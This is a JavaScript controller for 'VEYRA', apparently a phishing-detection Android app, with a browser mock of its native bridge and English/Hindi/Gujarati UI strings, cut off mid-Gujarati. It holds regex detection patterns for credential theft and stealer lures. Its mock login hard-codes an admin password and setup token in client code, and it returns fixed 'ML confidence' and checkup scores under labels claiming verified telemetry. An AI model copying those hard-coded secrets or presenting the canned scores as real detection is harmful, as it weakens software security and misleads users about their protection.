/**
 * VEYRA — On-Device Security Assistant
 * Core Client Controller with Real Telemetry, Dynamic Pop-ups, and Full Trilingual Localization
 */

// ==========================================================================
// 1. WEB PREVIEW NATIVE BRIDGE EMULATION (FOR TESTING OUTSIDE APK)
// ==========================================================================
if (!window.VeyraNative) {
  window.VeyraNative = {
    getInstallationId: function() {
      let id = localStorage.getItem("veyra_install_id");
      if (!id) {
        id = "VYR-" + Math.random().toString(16).substring(2, 10).toUpperCase();
        localStorage.setItem("veyra_install_id", id);
      }
      return id;
    },
    getDeviceInfo: function() {
      return JSON.stringify({
        installationId: window.VeyraNative.getInstallationId(),
        deviceName: "Android Device (Emulated)",
        appVersion: "1.0.0",
        registrationStatus: "Saved Locally",
        platform: "Android",
        isSetupCompleted: localStorage.getItem("veyra_setup_done") === "1"
      });
    },
    completeDeviceSetup: function() {
      localStorage.setItem("veyra_setup_done", "1");
    },
    getDashboardSummary: function() {
      let findings = JSON.parse(localStorage.getItem("veyra_findings") || "[]");
      let accessLogs = JSON.parse(localStorage.getItem("veyra_access_logs") || "[]");
      let blockedCount = accessLogs.filter(l => l.outcome === "ACCESS DENIED").length;
      let totalScans = findings.length;
      let threats = findings.filter(f => f.riskLevel === "HIGH RISK" || f.riskLevel === "SUSPICIOUS").length;
      let phish = findings.filter(f => (f.threatType || "").includes("Link") || (f.threatType || "").includes("URL") || (f.sanitizedEvidence || []).some(e => e.includes("URL") || e.includes("brand"))).length;
      let msgs = findings.filter(f => (f.threatType || "").includes("Message") || (f.threatType || "").includes("SMS") || (f.source || "").includes("SMS")).length;
      let highRisk = findings.filter(f => f.riskLevel === "HIGH RISK").length;
      let lastTime = findings.length > 0 ? findings[0].timestamp : 0;

      return JSON.stringify({
        total_scans: totalScans,
        threats_detected: threats,
        phishing_links: phish,
        suspicious_messages: msgs,
        high_risk_threats: highRisk,
        blocked_attempts: blockedCount,
        protection_status: "Active Protection",
        last_scan_time: lastTime,
        active_monitoring: true,
        is_notification_granted: true,
        recent_findings: findings.slice(0, 3)
      });
    },
    scanContent: function(text) {
      let lower = text.toLowerCase();
      let isHigh = /kyc|pan\s*card|deactivated|suspended|wire\s*transfer|javascript:|stealer|otp.*(?:share|send)/i.test(text);
      let isSuspicious = !isHigh && /parcel|delivery.*fee|urgent|verify.*account|bit\.ly|tinyurl|\.xyz|\.top/i.test(text);

      let riskLevel = isHigh ? "HIGH RISK" : (isSuspicious ? "SUSPICIOUS" : "NO KNOWN THREAT DETECTED");
      let riskScore = isHigh ? 88 : (isSuspicious ? 55 : 5);
      let indicators = [];
      if (isHigh) {
        indicators.push("Imminent suspension threat detected");
        indicators.push("Solicitation of sensitive credentials or OTP");
      }
      if (isSuspicious) {
        indicators.push("Unverified link or courier delivery pretext");
      }
      if (/javascript:/i.test(text)) {
        indicators.push("Dangerous script execution scheme");
      }
      if (/\.xyz|\.top/i.test(text)) {
        indicators.push("High-abuse top-level domain detected");
      }

      let findings = JSON.parse(localStorage.getItem("veyra_findings") || "[]");
      let item = {
        id: Date.now(),
        source: "Manual Scan",
        riskLevel: riskLevel,
        riskScore: riskScore,
        threatType: text.startsWith("http") ? "Link / URL" : "Message / SMS",
        sanitizedEvidence: indicators,
        actionStatus: isHigh ? "High Risk Warning" : (isSuspicious ? "Suspicious Warning" : "Safe"),
        timestamp: Date.now()
      };
      findings.unshift(item);
      localStorage.setItem("veyra_findings", JSON.stringify(findings));

      return JSON.stringify({
        riskLevel: riskLevel,
        riskScore: riskScore,
        indicators: indicators,
        explanation: isHigh ? "High risk indicators associated with credential phishing detected." : (isSuspicious ? "Suspicious social engineering patterns found." : "No recognized phishing patterns detected."),
        recommendedAction: isHigh ? "Do not open the link or enter personal credentials." : (isSuspicious ? "Verify the sender before taking action." : "Standard security vigilance recommended."),
        modelVersion: "Veyra-Hybrid-v1.2.0-Mobile",
        mlTextConfidence: isHigh ? 96 : 8,
        mlUrlConfidence: isHigh ? 92 : 4,
        targetSample: text.length > 50 ? text.substring(0, 50) + "..." : text
      });
    },
    scanEmail: function(emailText) {
      let isSpoof = /from:.*ceo|reply-to:.*wire|urgent.*wire/i.test(emailText);
      let indicators = isSpoof ? ["Display name spoofing / Reply-To reroute", "Urgent financial transfer solicitation"] : [];
      let riskLevel = isSpoof ? "HIGH RISK" : "NO KNOWN THREAT DETECTED";

      let findings = JSON.parse(localStorage.getItem("veyra_findings") || "[]");
      let item = {
        id: Date.now(),
        source: "Email Submission",
        riskLevel: riskLevel,
        riskScore: isSpoof ? 85 : 0,
        threatType: "Email Analysis",
        sanitizedEvidence: indicators,
        actionStatus: "Email Warned (Not Blocked)",
        timestamp: Date.now()
      };
      findings.unshift(item);
      localStorage.setItem("veyra_findings", JSON.stringify(findings));

      return JSON.stringify({
        riskLevel: riskLevel,
        riskScore: isSpoof ? 85 : 0,
        indicators: indicators,
        explanation: isSpoof ? "Deceptive header attributes and wire transfer keywords detected." : "Email headers and body passed baseline heuristics.",
        recommendedAction: "Verify sender address directly. Note that VEYRA does not block emails in your email application.",
        modelVersion: "Veyra-Hybrid-v1.2.0-Mobile",
        isEmailAnalysis: true
      });
    },
    getFindingsHistory: function(limit) {
      let findings = JSON.parse(localStorage.getItem("veyra_findings") || "[]");
      return JSON.stringify(findings.slice(0, limit || 50));
    },
    clearHistory: function() {
      localStorage.removeItem("veyra_findings");
    },
    getNotificationSettings: function() {
      return JSON.stringify({
        security_notifications: localStorage.getItem("notif_sec") !== "0",
        high_risk_alerts: localStorage.getItem("notif_high") !== "0",
        suspicious_link_alerts: localStorage.getItem("notif_link") !== "0",
        suspicious_message_alerts: localStorage.getItem("notif_msg") !== "0",
        permission_warnings: localStorage.getItem("notif_perm") !== "0",
        sound_alerts: localStorage.getItem("notif_sound") !== "0"
      });
    },
    saveNotificationSettings: function(str) {
      let obj = JSON.parse(str);
      localStorage.setItem("notif_sec", obj.security_notifications ? "1" : "0");
      localStorage.setItem("notif_high", obj.high_risk_alerts ? "1" : "0");
      localStorage.setItem("notif_link", obj.suspicious_link_alerts ? "1" : "0");
      localStorage.setItem("notif_msg", obj.suspicious_message_alerts ? "1" : "0");
      localStorage.setItem("notif_perm", obj.permission_warnings ? "1" : "0");
      localStorage.setItem("notif_sound", obj.sound_alerts ? "1" : "0");
    },
    getThemePreference: function() {
      return localStorage.getItem("veyra_theme") || "dark";
    },
    setThemePreference: function(t) {
      localStorage.setItem("veyra_theme", t);
    },
    getPermissionStatuses: function() {
      return JSON.stringify({
        notificationAccess: "Enabled",
        notificationPermission: "Enabled",
        smsFunctionality: "Not Configured",
        linkScanning: "Enabled",
        emailIntegration: "Not Connected"
      });
    },
    login: function(user, pass) {
      let accessLogs = JSON.parse(localStorage.getItem("veyra_access_logs") || "[]");
      if (user === "admin" && pass === "AdminVeyra@2026!") {
        accessLogs.unshift({ id: Date.now(), action: "LOGIN_SUCCESS", resource: "AUTH_PORTAL", ip: "127.0.0.1", details: "Admin login", outcome: "ACCESS GRANTED", timestamp: Date.now() });
        localStorage.setItem("veyra_access_logs", JSON.stringify(accessLogs));
        localStorage.setItem("veyra_auth_user", JSON.stringify({ username: "admin", role: "admin" }));
        return JSON.stringify({ success: true, user: { username: "admin", role: "admin" } });
      } else {
        accessLogs.unshift({ id: Date.now(), action: "LOGIN_FAILURE", resource: "AUTH_PORTAL", ip: "127.0.0.1", details: "Failed login for " + user, outcome: "ACCESS DENIED", timestamp: Date.now() });
        localStorage.setItem("veyra_access_logs", JSON.stringify(accessLogs));
        return JSON.stringify({ success: false, error: "Invalid administrator credentials. Access Denied." });
      }
    },
    getCurrentUser: function() {
      return localStorage.getItem("veyra_auth_user") || "null";
    },
    logout: function() {
      localStorage.removeItem("veyra_auth_user");
    },
    register: function(user, pass, token) {
      let accessLogs = JSON.parse(localStorage.getItem("veyra_access_logs") || "[]");
      if (token !== "VEYRA-ADMIN-SETUP-2026") {
        accessLogs.unshift({ id: Date.now(), action: "ADMIN_PROVISION_DENIED", resource: "ADMIN_SETUP", ip: "127.0.0.1", details: "Invalid token: " + token, outcome: "ACCESS DENIED", timestamp: Date.now() });
        localStorage.setItem("veyra_access_logs", JSON.stringify(accessLogs));
        return JSON.stringify({ success: false, error: "Invalid setup authorization key." });
      }
      return JSON.stringify({ success: true });
    },
    getAccessLogs: function() {
      let logs = JSON.parse(localStorage.getItem("veyra_access_logs") || "[]");
      return JSON.stringify(logs);
    },
    getRegisteredDevices: function() {
      return JSON.stringify([{
        installationId: window.VeyraNative.getInstallationId(),
        deviceName: "Android Device",
        platform: "Android",
        appVersion: "1.0.0",
        status: "Saved Locally",
        lastSeen: Date.now()
      }]);
    },
    runSecurityCheckup: function() {
      return JSON.stringify({
        overallScore: 100,
        passedCount: 3,
        totalChecks: 3,
        checks: [
          { title: "Screen Lock & Biometrics", passed: true, recommendation: "Biometrics active.", action_intent: "" },
          { title: "Real-Time Scam Notification Shield", passed: true, recommendation: "Protection active.", action_intent: "" },
          { title: "Developer Options & USB Debugging", passed: true, recommendation: "Standard sandbox.", action_intent: "" }
        ]
      });
    },
    getIncidentAdvice: function(type) {
      return JSON.stringify({
        title: "Containment Playbook (" + type.replace('_', ' ').toUpperCase() + ")",
        urgency: "HIGH URGENCY",
        steps: [
          "1. Immediately contact your bank or UPI app to freeze affected cards or accounts.",
          "2. Report the transaction to National Cybercrime Helpline 1930 (cybercrime.gov.in) within the golden hour.",
          "3. Change account passwords and security passcodes from a secure, clean device."
        ],
        helpline: "National Cybercrime Helpline: 1930"
      });
    },
    openNotificationSettings: function() {
      alert("On Android, this opens Android Notification Access Settings.");
    },
    setLanguage: function(lang) {
      localStorage.setItem("veyra_lang", lang);
    },
    getSelectedLanguage: function() {
      return localStorage.getItem("veyra_lang") || "en";
    }
  };
}

// ==========================================================================
// 2. TRILINGUAL LOCALIZATION DICTIONARY (EN, HI, GU)
// ==========================================================================
const I18N = {
  en: {
    tagline: "ON-DEVICE SECURITY",
    dashboard_title: "Security Overview",
    dashboard_subtitle: "Real-time on-device digital protection & genuine activity telemetry",
    status_active: "ACTIVE PROTECTION",
    status_attention: "ATTENTION NEEDED",
    posture_protected: "On-Device Shield Active",
    posture_desc: "Local machine learning is inspecting supported app notifications and manual content in memory. Zero raw messages transmitted.",
    quick_scan_btn: "🔍 Scan Link or Message",
    configure_protection_btn: "🛡️ Permission Setup",
    metrics_section: "Verified Security Metrics",
    metric_total_scans: "Total Scans",
    metric_total_sub: "Completed operations",
    metric_threats_detected: "Threats Detected",
    metric_threats_sub: "Suspicious & high risk",
    metric_phishing_links: "Phishing Links",
    metric_phishing_sub: "Deceptive URLs found",
    metric_suspicious_msgs: "Suspicious Messages",
    metric_msgs_sub: "Scams & smishing lures",
    metric_high_risk: "High-Risk Threats",
    metric_high_risk_sub: "Score ≥ 0.70 threshold",
    metric_blocked: "Blocked Attempts",
    metric_blocked_sub: "Unauthorized access denied",
    card_protection_status: "Protection Status",
    device_id_badge: "Device ID",
    recent_activity_title: "Recent Security Activity",
    view_all_btn: "View All",
    empty_activity_title: "No Security Events Recorded",
    empty_activity_desc: "Perform a scan or receive incoming messages to evaluate risk on-device.",
    coverage_transparency_title: "On-Device Privacy & Coverage Scope",
    coverage_transparency_text: "VEYRA inspects notifications from supported apps (SMS, WhatsApp, Banking, Delivery) strictly in volatile device RAM. VEYRA never uploads private conversations, contacts, or passwords to external cloud servers.",
    scan_centre_title: "Scan Centre",
    scan_centre_subtitle: "Inspect suspicious links, messages, and emails with local ML heuristics",
    demo_samples_label: "Instant Test Cases (Judges & Verification):",
    input_label_content: "Content to Analyze:",
    btn_analyse_content: "🛡️ Analyse Content",
    btn_clear: "Clear",
    evidence_heading: "Identified Threat Indicators:",
    rec_action_heading: "Recommended Action:",
    history_title: "Threat History",
    history_subtitle: "Persisted on-device detection records & security audit trail",
    btn_clear_history: "Clear",
    filter_all: "All",
    filter_safe: "Safe",
    filter_suspicious: "Suspicious",
    filter_high_risk: "High Risk",
    filter_phishing: "Phishing",
    filter_messages: "Messages",
    filter_blocked: "Access Denied",
    onboarding_title: "Device & Permissions Setup",
    onboarding_subtitle: "Configure real on-device security capabilities and verified permissions",
    device_identity_title: "Device Identity & Registration",
    lbl_device_name: "Device:",
    lbl_install_id: "Installation ID:",
    lbl_app_version: "App Version:",
    lbl_registration: "Registration:",
    device_privacy_note: "Your random installation ID is generated and stored locally. Sensitive device identifiers (IMEI, phone numbers, contacts) are never collected.",
    perm_section_title: "Capability & Permission Status",
    perm_notif_access_title: "Notification Access",
    perm_notif_access_desc: "Analyse relevant content exposed by supported application notifications, subject to Android restrictions and user consent.",
    btn_enable_access: "Enable Access",
    perm_notif_post_title: "Security Notification Channel",
    perm_notif_post_desc: "Display VEYRA's high-risk threat alerts and contextual warnings when suspicious activity is detected.",
    perm_sms_title: "SMS Functionality",
    perm_sms_desc: "Enable supported SMS-related security features, subject to Android permissions, platform restrictions, and privacy policies.",
    perm_link_title: "Link & Phishing Scanning",
    perm_link_desc: "Analyse links provided through manual scanning, sharing, or content ingestion methods on-device.",
    perm_email_title: "Email Integration",
    perm_email_desc: "Analyse email content through supported user-initiated sharing workflows. Provider-level mailbox blocking is not available.",
    checkup_title: "Safety Checkup",
    checkup_subtitle: "Audit baseline Android operating system hygiene and security settings",
    checkup_overall_label: "Overall Hygiene Score",
    btn_recheck: "Audit Device Now",
    recovery_title: "Incident Recovery",
    recovery_subtitle: "Immediate containment steps and official emergency reporting",
    helpline_title: "National Cybercrime Helpline: 1930",
    helpline_desc: "Immediate financial fraud golden hour reporting (cybercrime.gov.in / I4C CFCFRMS protocol)",
    triage_prompt: "Select what occurred:",
    inc_payment: "💸 I made a fraudulent payment or transferred money",
    inc_otp: "🔑 I shared an OTP or verification passcode",
    inc_card: "💳 I shared card, netbanking, or UPI details",
    inc_apk: "📱 I installed a suspicious APK or third-party app",
    admin_title: "Admin Portal",
    admin_subtitle: "Secure administrative operations, device registry & telemetry",
    admin_auth_title: "Administrator Authentication",
    admin_auth_note: "Administrative telemetry requires authorization. Sign in with the provisioned administrator account. Unauthorized access attempts are rejected and logged.",
    lbl_admin_user: "Admin Username",
    lbl_admin_pass: "Password",
    btn_admin_signin: "Sign In as Administrator",
    provision_summary: "Provision Authorized Admin Account",
    btn_register_admin: "Register Authorized Admin",
    connected_devices_title: "Connected Devices Registry",
    access_denial_title: "Access Denial & Audit Events",
    benchmarks_title: "Verified On-Device ML Benchmarks",
    btn_logout: "Logout",
    settings_title: "Settings",
    settings_subtitle: "Customise appearance, notification alerts, and privacy preferences",
    sec_appearance: "Appearance",
    lbl_dark_mode: "Dark Theme",
    desc_dark_mode: "Deep navy cybersecurity styling",
    sec_notifications: "Security Notifications",
    notif_security: "Security Notifications",
    notif_security_desc: "Receive in-app alerts for security detections",
    notif_high_risk: "High-Risk Alerts",
    notif_high_risk_desc: "System popup notifications for dangerous threats",
    notif_suspicious_link: "Suspicious Link Alerts",
    notif_link_desc: "Alert when deceptive or lookalike URLs detected",
    notif_suspicious_msg: "Suspicious Message Alerts",
    notif_msg_desc: "Alert when OTP lures or urgent scams found",
    notif_perm_warnings: "Permission Warnings",
    notif_perm_desc: "Notify if protection access is disabled",
    notif_sound: "Notification Sound",
    notif_sound_desc: "Play audio cue on high-risk detection",
    sec_privacy: "Privacy & Local Storage",
    privacy_desc: "• Zero Telemetry Exfiltration: Content stays strictly on your physical Android device.\n• Sanitized History Only: Passwords, OTPs, and private messages are never saved.\n• Local Database: SQLite database (veyra_secure.db).",
    btn_clear_scan_history: "Clear Local Scan History",
    sec_about: "About VEYRA",
    nav_home: "Home",
    nav_scan: "Scan",
    nav_activity: "Activity",
    nav_shield: "Shield",
    nav_help: "Help",
    nav_settings: "Settings",
    // Smart pop-up strings
    pop_link_heading: "This Link May Be Dangerous!",
    pop_link_body: "Our security engine detected suspicious indicators associated with this link.",
    lbl_reasons: "Detection Reasons:",
    lbl_rec_action: "Recommended Action:",
    pop_link_rec: "Do not open the link or enter personal information.",
    btn_dismiss: "Dismiss",
    btn_threat_details: "View Threat Details",
    pop_msg_heading: "Suspicious Message Detected!",
    pop_msg_body: "Our on-device scanner detected deceptive patterns commonly used in financial fraud and credential theft.",
    pop_msg_rec: "Do not share OTPs, passwords, or banking information.",
    btn_analyse_details: "Analyse Details",
    pop_email_heading: "Potential Phishing Email Detected!",
    pop_email_body: "Indicators of sender spoofing or credential requests were found in the analysed email.",
    pop_email_rec: "Verify the sender before opening links or sharing information.",
    btn_view_analysis: "View Analysis",
    pop_access_heading: "Unauthorised Access Attempt Detected!",
    pop_access_body: "An unauthenticated request targeted a protected VEYRA administrative resource.",
    btn_view_sec_event: "View Security Event",
    pop_safe_heading: "No Known Threats Detected",
    pop_safe_body: "The scanned content did not trigger any configured phishing, smishing, or brand impersonation rules.",
    pop_safe_note: "Passed deterministic heuristic checks and on-device hybrid ML classification.",
    btn_view_report: "View Scan Report",
    pop_perm_heading: "Your Protection Needs Attention",
    pop_perm_body: "Notification Access is disabled. Real-time background detection of scam messages and suspicious links is currently inactive.",
    welcome_title: "Your Privacy Matters.",
    welcome_desc: "Protect yourself from suspicious links, phishing attempts, and scam messages with 100% on-device security.",
    btn_setup_protection: "🛡️ Set Up Protection",
    btn_continue_no_login: "Continue Without Login"
  },

  hi: {
    tagline: "ऑन-डिवाइस सुरक्षा",
    dashboard_title: "सुरक्षा अवलोकन",
    dashboard_subtitle: "रीयल-टाइम ऑन-डिवाइस सुरक्षा और प्रामाणिक गतिविधि डेटा",
    status_active: "सक्रिय सुरक्षा",
    status_attention: "ध्यान दें",
    posture_protected: "ऑन-डिवाइस सुरक्षा सक्रिय",
    posture_desc: "स्थानीय मशीन लर्निंग मेमोरी में समर्थित ऐप सूचनाओं और सामग्री की जांच कर रही है। शून्य डेटा प्रेषित।",
    quick_scan_btn: "🔍 लिंक या संदेश स्कैन करें",
    configure_protection_btn: "🛡️ अनुमति सेटअप",
    metrics_section: "सत्यापित सुरक्षा मेट्रिक्स",
    metric_total_scans: "कुल स्कैन",
    metric_total_sub: "पूर्ण किए गए स्कैन",
    metric_threats_detected: "खतरे पहचाने गए",
    metric_threats_sub: "संदेहास्पद और उच्च जोखिम",
    metric_phishing_links: "फ़िशिंग लिंक्स",
    metric_phishing_sub: "पहचाने गए कपटपूर्ण लिंक",
    metric_suspicious_msgs: "संदेहास्पद संदेश",
    metric_msgs_sub: "धोखाधड़ी और स्मिशिंग झांसे",
    metric_high_risk: "उच्च जोखिम वाले खतरे",
    metric_high_risk_sub: "स्कोर ≥ 0.70 सीमा",
    metric_blocked: "रोके गए प्रयास",
    metric_blocked_sub: "अनधिकृत पहुंच अस्वीकृत",
    card_protection_status: "सुरक्षा स्थिति",
    device_id_badge: "डिवाइस आईडी",
    recent_activity_title: "हाल की सुरक्षा गतिविधि",
    view_all_btn: "सभी देखें",
    empty_activity_title: "कोई सुरक्षा गतिविधि दर्ज नहीं",
    empty_activity_desc: "ऑन-डिवाइस सुरक्षा जांच शुरू करने के लिए कोई लिंक या संदेश स्कैन करें।",
    coverage_transparency_title: "ऑन-डिवाइस गोपनीयता और कवरेज",
    coverage_transparency_text: "VEYRA समर्थित ऐप्स की सूचनाओं की जांच केवल डिवाइस मेमोरी (रैम) में करता है। निजी संदेश या पासवर्ड कभी सर्वर पर नहीं भेजे जाते।",
    scan_centre_title: "स्कैन केंद्र",
    scan_centre_subtitle: "संदेहास्पद लिंक, संदेश और ईमेल की ऑन-डिवाइस जांच करें",
    demo_samples_label: "तत्काल परीक्षण नमूने (मूल्यांकन हेतु):",
    input_label_content: "जांच हेतु सामग्री:",
    btn_analyse_content: "🛡️ सामग्री की जांच करें",
    btn_clear: "साफ़ करें",
    evidence_heading: "पहचाने गए खतरे के संकेत:",
    rec_action_heading: "अनुशंसित कार्रवाई:",
    history_title: "खतरों का इतिहास",
    history_subtitle: "डिवाइस पर संग्रहीत सुरक्षा रिकॉर्ड और ऑडिट लॉग",
    btn_clear_history: "साफ़ करें",
    filter_all: "सभी",
    filter_safe: "सुरक्षित",
    filter_suspicious: "संदेहास्पद",
    filter_high_risk: "उच्च जोखिम",
    filter_phishing: "फ़िशिंग",
    filter_messages: "संदेश",
    filter_blocked: "अस्वीकृत",
    onboarding_title: "डिवाइस और अनुमति सेटअप",
    onboarding_subtitle: "ऑन-डिवाइस सुरक्षा क्षमताओं और आवश्यक अनुमतियों को कॉन्फ़िगर करें",
    device_identity_title: "डिवाइस पहचान और पंजीकरण",
    lbl_device_name: "डिवाइस:",
    lbl_install_id: "इंस्टॉलेशन आईडी:",
    lbl_app_version: "ऐप वर्शन:",
    lbl_registration: "पंजीकरण:",
    device_privacy_note: "आपकी रैंडम इंस्टॉलेशन आईडी स्थानीय रूप से बनाई गई है। आईएमईआई या संपर्क कभी एकत्र नहीं किए जाते।",
    perm_section_title: "क्षमता और अनुमति स्थिति",
    perm_notif_access_title: "नोटिफिकेशन एक्सेस",
    perm_notif_access_desc: "समर्थित ऐप्स की सूचनाओं में से प्रासंगिक सामग्री की सुरक्षित ऑन-डिवाइस जांच करें।",
    btn_enable_access: "एक्सेस सक्षम करें",
    perm_notif_post_title: "सुरक्षा नोटिफिकेशन चैनल",
    perm_notif_post_desc: "खतरा मिलने पर VEYRA की सुरक्षा चेतावनियां और अलर्ट प्रदर्शित करें।",
    perm_sms_title: "एसएमएस कार्यक्षमता",
    perm_sms_desc: "एंड्रॉइड सुरक्षा नीतियों के तहत समर्थित एसएमएस सुरक्षा सुविधाएं सक्षम करें।",
    perm_link_title: "लिंक और फ़िशिंग स्कैनिंग",
    perm_link_desc: "शेयर किए गए या दर्ज किए गए लिंक की स्थानीय स्तर पर जांच करें।",
    perm_email_title: "ईमेल एकीकरण",
    perm_email_desc: "उपयोगकर्ता द्वारा प्रदान किए गए ईमेल की जांच। जीमेल इनबॉक्स को सीधे ब्लॉक नहीं किया जा सकता।",
    checkup_title: "सुरक्षा चेकअप",
    checkup_subtitle: "एंड्रॉइड ऑपरेटिंग सिस्टम और सुरक्षा सेटिंग्स का ऑडिट करें",
    checkup_overall_label: "समग्र सुरक्षा स्कोर",
    btn_recheck: "अभी ऑडिट करें",
    recovery_title: "घटना रिकवरी",
    recovery_subtitle: "धोखाधड़ी होने पर तत्काल रोकथाम के कदम और हेल्पलाइन 1930",
    helpline_title: "राष्ट्रीय साइबर अपराध हेल्पलाइन: 1930",
    helpline_desc: "वित्तीय धोखाधड़ी की आपातकालीन रिपोर्टिंग (cybercrime.gov.in)",
    triage_prompt: "चुनें कि क्या हुआ:",
    inc_payment: "💸 मैंने धोखे से पैसे भेज दिए",
    inc_otp: "🔑 मैंने ओटीपी या पासवर्ड साझा कर दिया",
    inc_card: "💳 मैंने बैंक या कार्ड विवरण साझा किया",
    inc_apk: "📱 मैंने कोई संदिग्ध ऐप या एपीके इंस्टॉल किया",
    admin_title: "एडमिन पोर्टल",
    admin_subtitle: "सुरक्षित प्रशासनिक संचालन और डिवाइस टेलीमेट्री",
    admin_auth_title: "प्रशासक प्रमाणीकरण",
    admin_auth_note: "प्रशासनिक टेलीमेट्री के लिए प्रमाणीकरण आवश्यक है। अनधिकृत प्रयासों को अस्वीकार कर लॉग किया जाता है।",
    lbl_admin_user: "एडमिन यूज़रनेम",
    lbl_admin_pass: "पासवर्ड",
    btn_admin_signin: "एडमिन के रूप में साइन इन करें",
    provision_summary: "अधिकृत एडमिन खाता बनाएं",
    btn_register_admin: "एडमिन पंजीकृत करें",
    connected_devices_title: "कनेक्टेड डिवाइस रजिस्ट्री",
    access_denial_title: "पहुंच अस्वीकृति और ऑडिट लॉग",
    benchmarks_title: "सत्यापित ऑन-डिवाइस एमएल बेंचमार्क",
    btn_logout: "लॉग आउट",
    settings_title: "सेटिंग्स",
    settings_subtitle: "दिखावट, नोटिफिकेशन और गोपनीयता सेटिंग्स",
    sec_appearance: "दिखावट",
    lbl_dark_mode: "डार्क थीम",
    desc_dark_mode: "गहरे नेवी रंग की साइबर सुरक्षा शैली",
    sec_notifications: "सुरक्षा नोटिफिकेशन",
    notif_security: "सुरक्षा सूचनाएं",
    notif_security_desc: "खतरे की पहचान पर इन-ऐप अलर्ट प्राप्त करें",
    notif_high_risk: "उच्च जोखिम अलर्ट",
    notif_high_risk_desc: "गंभीर खतरों के लिए सिस्टम पॉपअप अलर्ट",
    notif_suspicious_link: "संदेहास्पद लिंक अलर्ट",
    notif_link_desc: "कपटपूर्ण लिंक मिलने पर सूचना दें",
    notif_suspicious_msg: "संदेहास्पद संदेश अलर्ट",
    notif_msg_desc: "ओटीपी या झांसे वाले संदेशों पर अलर्ट करें",
    notif_perm_warnings: "अनुमति चेतावनियां",
    notif_perm_desc: "यदि सुरक्षा अनुमति बंद हो तो सूचित करें",
    notif_sound: "अलर्ट ध्वनि",
    notif_sound_desc: "उच्च जोखिम पर ध्वनि बजाएं",
    sec_privacy: "गोपनीयता और स्थानीय डेटा",
    privacy_desc: "• शून्य रिमोट डेटा: सारा डेटा आपके फ़ोन पर ही रहता है।\n• केवल सुरक्षित इतिहास: पासवर्ड या संवेदनशील संदेश कभी सेव नहीं होते।\n• स्थानीय डेटाबेस: SQLite (veyra_secure.db)।",
    btn_clear_scan_history: "स्थानीय स्कैन इतिहास साफ़ करें",
    sec_about: "VEYRA के बारे में",
    nav_home: "होम",
    nav_scan: "स्कैन",
    nav_activity: "गतिविधि",
    nav_shield: "सुरक्षा",
    nav_help: "सहायता",
    nav_settings: "सेटिंग्स",
    pop_link_heading: "यह लिंक खतरनाक हो सकता है!",
    pop_link_body: "हमारे सुरक्षा इंजन ने इस लिंक में संदेहास्पद संकेत पाए हैं।",
    lbl_reasons: "पहचान के कारण:",
    lbl_rec_action: "अनुशंसित कार्रवाई:",
    pop_link_rec: "लिंक न खोलें और व्यक्तिगत विवरण दर्ज न करें।",
    btn_dismiss: "खारिज करें",
    btn_threat_details: "खतरे का विवरण देखें",
    pop_msg_heading: "संदेहास्पद संदेश पहचाना गया!",
    pop_msg_body: "इस संदेश में वित्तीय धोखाधड़ी या क्रेडेंशियल चोरी के संकेत मिले हैं।",
    pop_msg_rec: "ओटीपी, पासवर्ड या बैंकिंग विवरण साझा न करें।",
    btn_analyse_details: "विवरण जांचें",
    pop_email_heading: "संभावित फ़िशिंग ईमेल पहचाना गया!",
    pop_email_body: "ईमेल में प्रेषक के फ़र्जी होने या क्रेडेंशियल मांगने के संकेत हैं।",
    pop_email_rec: "कोई लिंक खोलने से पहले प्रेषक की पुष्टि करें।",
    btn_view_analysis: "विश्लेषण देखें",
    pop_access_heading: "अनधिकृत पहुंच का प्रयास पहचाना गया!",
    pop_access_body: "एक अप्रमाणित अनुरोध ने सुरक्षित एडमिन संसाधन पर पहुंच का प्रयास किया।",
    btn_view_sec_event: "सुरक्षा घटना देखें",
    pop_safe_heading: "कोई ज्ञात खतरा नहीं मिला",
    pop_safe_body: "स्कैन की गई सामग्री ने किसी फ़िशिंग या धोखाधड़ी नियम को ट्रिगर नहीं किया।",
    pop_safe_note: "सामग्री हेयूरिस्टिक और स्थानीय एमएल मॉडल परीक्षणों में सुरक्षित पाई गई।",
    btn_view_report: "स्कैन रिपोर्ट देखें",
    pop_perm_heading: "आपकी सुरक्षा पर ध्यान देने की आवश्यकता है",
    pop_perm_body: "नोटिफिकेशन एक्सेस अक्षम है। रीयल-टाइम बैकग्राउंड सुरक्षा वर्तमान में निष्क्रिय है।",
    welcome_title: "आपकी गोपनीयता महत्वपूर्ण है।",
    welcome_desc: "संदेहास्पद लिंक, फ़िशिंग और धोखाधड़ी संदेशों से 100% ऑन-डिवाइस सुरक्षा प्राप्त करें।",
    btn_setup_protection: "🛡️ सुरक्षा सेट करें",
    btn_continue_no_login: "लॉगिन के बिना जारी रखें"
  },

  gu: {
    tagline: "ઑન-ડિવાઇસ સુરક્ષા",
    dashboard_title: "સુરક્ષા ઝાંખી",
    dashboard_subtitle: "રીયલ-ટાઇમ ઑન-ડિવાઇસ સુરક્ષા અને પ્રમાણિક પ્રવૃત્તિ ડેટા",
    status_active: "સક્રિય સુરક્ષા",
    status_attention: "ધ્યાન આપો",
    posture_protected: "ઑન-ડિવાઇસ સુરક્ષા સક્રિય",
    posture_desc: "સ્થાનિક મશીન લર્નિંગ મેમરીમાં સમર્થિત એપ્લિકેશન સૂચનાઓની તપાસ કરી રહી છે. શૂન્ય ડેટા ટ્રાન્સમિટ.",
    quick_scan_btn: "🔍 લિંક અથવા સંદેશ સ્કેન કરો",
    configure_protection_btn: "🛡️ પરવાનગી સેટઅપ",
    metrics_section: "ચકાસાયેલ સુરક્ષા મેટ્રિક્સ",
    metric_total_scans: "કુલ સ્કેન",
    metric_total_sub: "પૂર્ણ કરેલા સ્કેન",
    metric_threats_detected: "જોખમો ઓળખાયા",
    metric_threats_sub: "શંકાસ્પદ અને ઉચ્ચ જોખમ",
    metric_phishing_links: "ફિશિંગ લિંક્સ",
    metric_phishing_sub: "ઓળખાયેલ કપટી લિંક્સ",
    metric_suspicious_msgs: "શંકાસ્પદ સંદેશાઓ",
    metric_msgs_sub: "છેતરપિંડી અને સ્મિશિંગ પ્રલોભન",
    metric_high_risk: "ઉચ્ચ જોખમી જોખમો",
    metric_high_risk_sub: "સ્કોર ≥ 0.70 મર્યાદા",
    metric_blocked: "અટકાવેલા પ્રયાસો",
    metric_blocked_sub: "અનધિકૃત પ્રવેશ નકારાયો",
    card_protection_status: "સુરક્ષા સ્થિતિ",
    device_id_badge: "ડિવાઇસ આઈડી",
    recent_activity_title: "તાજેતરની સુરક્ષા પ્રવૃત્તિ",
    view_all_btn: "બધું જુઓ",
    empty_activity_title: "કોઈ સુરક્ષા પ્રવૃત્તિ નોંધાયેલ નથી",
